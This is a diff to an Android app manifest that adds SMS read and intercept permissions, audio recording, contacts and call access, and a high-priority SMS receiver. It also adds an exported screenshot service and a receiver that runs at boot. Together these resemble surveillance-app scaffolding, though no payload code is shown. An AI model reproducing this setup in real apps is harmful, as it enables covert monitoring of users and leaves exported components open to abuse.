@@ -7,11 +7,39 @@
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 
 
-    <uses-permission android:name="android.permission.INTERNET" />
+
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+
     <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
 
+
+
+
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+
+    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.BLUETOOTH" />
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+
+
+    <!--for the message sms-->
+    <uses-permission android:name="android.permission.WRITE_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+
+
+    <!-- Admob -->
+
+    <!-- Billing for in-app purchases -->
+    <uses-permission android:name="com.android.vending.BILLING" />
 
 
 
@@ -36,6 +64,88 @@
         <activity android:name="com.clientserverchat.ClientActivity"/>
 
         <activity android:name="com.clientserverchat.ServerActivity"/>
+
+
+
+
+        <activity
+            android:name="com.messages.ActMessages"
+            android:screenOrientation="portrait" />
+        <activity
+            android:name="com.messages.ActMyMessages"
+            android:screenOrientation="portrait" />
+        <activity
+            android:name="com.messages.ActConvoMessageBox"
+            android:screenOrientation="portrait" />
+
+        <activity
+            android:name="com.messages.ActAllMessageBox"
+            android:screenOrientation="portrait" />
+        <activity
+            android:name="com.messages.screen.ActScreenshot"
+            android:screenOrientation="portrait" />
+
+
+
+
+        <service android:name="com.messages.MessagingService">
+        </service>
+
+        <receiver
+            android:name="com.messages.MessageReadReceiver"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="com.example.android.messagingservice.ACTION_MESSAGE_READ"/>
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name="com.messages.MessageReplyReceiver"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="com.example.android.messagingservice.ACTION_MESSAGE_REPLY"/>
+            </intent-filter>
+        </receiver>
+
+
+
+        <!--for the sms-->
+        <receiver android:name="com.messages.SmsBroadcastReceiver" android:exported="true" >
+            <intent-filter android:priority="999" >
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+
+
+        <!--for the screen capture service-->
+        <service
+            android:name="com.messages.screen.ScreenshotService"
+            android:exported="true" />
+
+
+
+        <!--for the alarm study reminder-->
+        <!--for the Alarm Receiver-->
+        <!-- <receiver android:name="com.alarm.AlarmManagerBroadcastReceiver">
+             <intent-filter>
+                 <action android:name="NOTIFICATION_SERVICE" />
+             </intent-filter>
+         </receiver>-->
+
+        <receiver
+            android:enabled="true"
+            android:exported="true"
+            android:name="com.messages.utils.ReceiverRunOnStartup"
+            android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
+
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </receiver>
+
 
     </application>
 
